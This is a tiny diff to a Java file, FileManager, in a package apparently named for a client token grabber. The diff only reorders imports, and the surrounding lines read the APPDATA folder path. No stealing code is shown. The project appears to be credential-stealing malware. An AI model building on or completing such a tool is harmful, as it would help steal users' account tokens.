@@ -1,9 +1,9 @@
 package main.java.clienttokengrabber.utils;
 
-import java.nio.file.Paths;
 import java.util.List;
 import java.util.ArrayList;
 import java.io.File;
+import java.nio.file.Paths;
 
 public class FileManager {
     public static final String ROAMING = System.getenv("APPDATA");
